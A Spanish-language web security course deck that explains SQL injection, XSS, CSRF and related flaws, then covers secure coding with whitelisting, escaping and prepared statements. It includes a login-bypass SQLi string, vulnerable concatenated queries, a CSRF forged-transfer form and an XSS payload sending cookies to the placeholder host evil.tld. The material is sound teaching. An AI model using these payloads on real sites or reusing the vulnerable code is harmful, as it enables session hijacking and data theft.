Introducción

¿Por qué es crucial la seguridad web?

El escenario actual

  • Las aplicaciones web son el principal vector de entrada a las organizaciones.
  • Un solo fallo puede filtrar datos de millones de usuarios en segundos.
  • El costo de corregir un bug en producción es 100× mayor que en diseño.
  • La seguridad ya no es optativa: es un requisito funcional.

El triángulo CIA

C
Confidencialidad

Solo quien está autorizado accede a la información.

I
Integridad

Los datos no son alterados de forma no autorizada.

A
Disponibilidad

El sistema está accesible cuando se necesita.

Vulnerabilidades convencionales · Panorama OWASP

¿Qué es una vulnerabilidad?

Debilidad en el diseño, la implementación o la operación de una aplicación que un atacante puede explotar para alterar el comportamiento esperado del sistema.

Técnicas de explotación

Inyección SQL (SQLi)

Cómo opera

  1. El atacante inserta SQL malicioso en una entrada de datos.
  2. La consulta se concatena sin sanitizar → el motor ejecuta instrucciones extra.
  3. Resultado: bypass de autenticación, lectura o borrado de la BD, toma de control.
Impacto Exfiltración masiva de datos, elusión de login y, en sistemas mal configurados, ejecución de comandos en el servidor.

Código vulnerable

// Vulnerable: concatenación directa
const q = `SELECT * FROM users
  WHERE user = '${user}'
    AND pass = '${pass}'`;

Vector de ataque

user: admin' OR '1'='1' --
pass: (cualquiera)

// SQL resultante:
SELECT * FROM users WHERE user='admin'
  OR '1'='1' --' AND pass='...'

Técnicas de explotación

Cross-Site Scripting (XSS)

01

Reflejado

El payload viaja en la URL y se devuelve sin filtrar en la respuesta (p. ej. en un error o buscador).

Ej: ?q=<script>…

02

Persistente (Stored)

El script queda guardado en la BD (comentarios, perfil) y se ejecuta para todos que lo visitan.

Mayor alcance y gravedad

03

DOM-based

El fallo ocurre 100% en el cliente: el JS manipula el DOM con datos de la URL sin pasar por el servidor.

Ej: innerHTML = location.hash

Impacto directo

  • Robo de cookies y tokens de sesión (session hijacking).
  • Suplantación de identidad y acciones en nombre de la víctima.
  • Redirección a sitios falsos (phishing) dentro del dominio de confianza.
  • Keylogging y modificación del contenido mostrado.

Ejemplo de payload

<script>
  document.location=
  'https://evil.tld/steal?c='
  + document.cookie
</script>

Con HttpOnly en la cookie, el robo directo falla → defensa en profundidad.

Técnicas de explotación

CSRF y otras amenazas

Cross-Site Request Forgery

El navegador envía automáticamente las cookies de un sitio a cualquier petición que salga hacia él. Si un atacante logra que tu navegador haga una petición a tu banco, esa petición parece legítima.

  1. Estás logeado en banco.com.
  2. Visitas un sitio malicioso con un <img> o form oculto.
  3. El navegador ejecuta POST /transferir con tu cookie.
  4. La transferencia se realiza sin que lo sepas.
<form action="https://banco.com/transferir" method="POST">
  <input name="destino" value="atacante">
  <input name="monto" value="10000">
</form>

Otras amenazas frecuentes

  • Exposición de datos sensibles Tokens en URLs, errores con stack trace, claves en el repositorio, datos sin cifrar (HTTP).
  • Control de acceso roto (IDOR / Broken Access) Modificar ?id=123 para ver o editar recursos de otro usuario porque no hay autorización en servidor.
  • Fallas de autenticación Contraseñas débiles, falta de rate-limit y sesiones que no expiran.
  • Vulnerabilidades de componentes Librerías con CVE conocidos y sin actualizar.

4.3 · Programación segura

Introducción a la Programación Segura

Security by Design

Cambio de paradigma: la seguridad no es una capa que se agrega al final, sino una propiedad que se diseña desde la primera línea de código.

Antes

Codificar → testear → parchear vulnerabilidades en producción.

Ahora

Modelar amenazas → diseño seguro → implementar → verificar continuamente.

Principio de Menor Privilegio

Cada usuario, proceso y componente recibe solo los permisos estrictamente necesarios para su función, y solo durante el tiempo que los necesite.

  • Usuario sin permisos de administrador → no puede borrar la BD.
  • App conectada con cuenta SELECT-only → un SQLi no borra tablas.
  • Sesión de corta duración con expiración y rotación.
Defensa en profundidad Fallar de forma segura Separación de componentes Mínima sorpresa Keep it simple

4.3 · Mitigación

Validación y Sanitización de entradas

✓ Whitelisting (lista blanca)

Definir lo que SÍ está permitido. Todo lo demás se rechaza.

// Solo dígitos, 10 posiciones
if (!/^\d{10}$/.test(tel)) throw new Error("Teléfono inválido");

// Solo roles conocidos
if (!ROLES.includes(rol)) rol = "guest";

✅ Recomendado: predecible, auditable, imposible de "evadir con creatividad".

✗ Blacklisting (lista negra)

Bloquear lo que se considera malo. Cualquier patrón nuevo lo elude.

// Frágil: se salta con mayúsculas,
// comentarios SQL, codificación, doble codificación…
if (input.includes("SELECT") ||
    input.includes("<script>")) return null;

✗ Selek/SeLeCt, <SCRIPT>, %3Cscript% → evasión garantizada.

Sanitización y escape según el contexto

HTML

Escapar & < > " ' antes de insertar en el DOM.

SQL

Usar consultas preparadas; nunca concatenar entrada del usuario.

URL / JS / Shell

Codificar con las funciones del contexto específico, no una genérica.

Regla de oro: validar en la entrada, escapar en la salida y validar otra vez en el servidor (nunca confiar solo en el cliente).

4.3 · Defensas técnicas

Consultas preparadas y cabeceras HTTP

Prepared Statements vs. concatenación

// ✗ Vulnerable
db.query(`SELECT * FROM users
   WHERE user = '${user}'`);

// ✓ Seguro: parámetros separados del SQL
db.query(`SELECT * FROM users
   WHERE user = ?`, [user]);

// ✓ ORM con binding tipado
User.findOne({ where: { user } });

El motor recibe la consulta y los datos por separado: el input jamás se interpreta como código SQL. Es la defensa nº1 contra SQLi (y aplica a NoSQL e XPath).
